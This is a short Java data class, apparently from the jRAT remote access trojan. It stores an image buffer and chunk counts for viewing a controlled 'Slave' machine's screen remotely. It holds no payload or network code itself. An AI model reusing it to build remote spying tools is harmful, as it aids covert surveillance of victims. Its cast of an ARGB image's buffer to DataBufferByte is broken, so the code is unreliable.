package pro.jrat;

import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;

public class RemoteScreenData {

	private BufferedImage bufferedImage;
	private byte[] buffer;
	private boolean createdIcon;
	private int chunks;
	private int updatedChunks;

	public RemoteScreenData(Slave slave, int w, int h) {
		bufferedImage = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
		buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
		createdIcon = false;
	}

	public BufferedImage getBufferedImage() {
		return bufferedImage;
	}

	public byte[] getBuffer() {
		return buffer;
	}

	public boolean hasCreatedIcon() {
		return createdIcon;
	}

	public void setIcon() {
		createdIcon = true;
	}

	public int getUpdatedChunks() {
		return updatedChunks;
	}

	public void setUpdatedChunks(int updatedChunks) {
		this.updatedChunks = updatedChunks;
	}

	public int getChunks() {
		return chunks;
	}

	public void setChunks(int chunks) {
		this.chunks = chunks;
	}

}
